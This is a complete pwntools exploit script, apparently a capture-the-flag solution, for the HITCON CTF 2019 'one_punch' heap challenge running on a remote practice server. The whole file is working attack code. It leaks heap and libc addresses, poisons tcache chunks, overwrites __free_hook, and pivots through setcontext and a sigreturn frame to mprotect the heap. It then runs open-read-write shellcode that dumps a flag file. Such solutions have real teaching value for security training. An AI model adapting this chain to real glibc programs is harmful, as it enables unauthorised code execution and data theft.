# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './hitcon_ctf_2019_one_punch'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '29805'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(id,text = "a"*0x80):
    cmd(1)
    sla("idx: ",id)
    sa("hero name: ",text)

def edit(id,text):
    cmd(2)
    sla("idx: ",id)
    sa("hero name: ",text)

def show(id):
    cmd(3)
    sla("idx: ",id)

def delete(id):
    cmd(4)
    sla("idx: ",id)

def new(text):
    cmd(50056)
    se(text)

one_gad = one_gadget(libc.path)

add(2,"a" * 0x217)

for i in range(2):
    add(0, 'a' * 0x217)
    delete(0)

show(0)
ru("name: ")
heap_addr = u64(p.recvuntil("\n",drop=True).ljust(8,"\x00")) & 0xfffffffffffff000

for i in range(5):
    add(0, 'a' * 0x217)
    delete(0)

delete(2)
show(2)
libc_addr = l64()- 0x70

libc.address = libc_addr - libc.sym["__malloc_hook"]
__free_hook = libc.sym["__free_hook"]
pop_rax_ret = libc.address + 0x47cf8
syscall_ret = libc.address + 0xcf6c5
ret = libc.address + 0x55cc4
setcontext =libc.address + 0x55E35

# SROP setcontext shellcode

length = 0xe0
add(0, 'a' * length)
add(0, 'a' * 0x80)

#这两个堆块为2号堆块

edit(2, '\x00' * length + p64(0) + p64(0x21)) #修改此时0号 chunk 头
delete(0)

edit(2, '\x00' * length + p64(0) + p64(0x31))
delete(0)

edit(2, '\x00' * length + p64(0) + p64(0x3a1))
delete(0)

for i in range(3):
    add(1, 'b' * 0x3a8)
    delete(1)

edit(2, '\x00' * length + p64(0x300) + p64(0x570) + p64(0) + p64(0) + p64(heap_addr + 0x40) + p64(heap_addr + 0x40))
delete(0)

add(0, 'c' * 0x100 + p64( __free_hook) + '\x00')

paylaod = flat([ pop_rax_ret,10, syscall_ret , heap_addr + 0x260 + 0xf8 ])

new( p64(libc.address + 0x12be97) + paylaod  + '\x00')

frame = SigreturnFrame()
frame.rdi = heap_addr
frame.rsi = 0x1000
frame.rdx = 7
frame.rsp = __free_hook + 8
frame.rip = ret

shellcode = asm('''
push 0x67616c66 ;// flag
mov rdi, rsp
xor esi, esi
mov eax, 2
syscall

cmp eax, 0
js fail

mov edi, eax
mov rsi, rsp
mov edx, 100
xor eax, eax
syscall ;// read

mov edx, eax
mov rsi, rsp
mov eax, 1
mov edi, eax
syscall ;// write

jmp exit

fail:
mov rax, 0x727265206e65706f ;// open error!
mov [rsp], rax
mov eax, 0x0a21726f
mov [rsp+8], rax
mov rsi, rsp
mov edi, 1
mov edx, 12
mov eax, edi
syscall ;// write

exit:
xor edi, edi
mov eax, 231
syscall 
''')

edit(2, p64(setcontext) + p64(heap_addr + 0x260) + str(frame)[0x10:] + shellcode)
# 在一直没有变的 2 号堆块上写rop 

delete(2)


p.interactive()

'''
@File    :   hitcon_ctf_2019_one_punch.py
@Time    :   2021/08/18 14:37:12
@Author  :   Niyah 
'''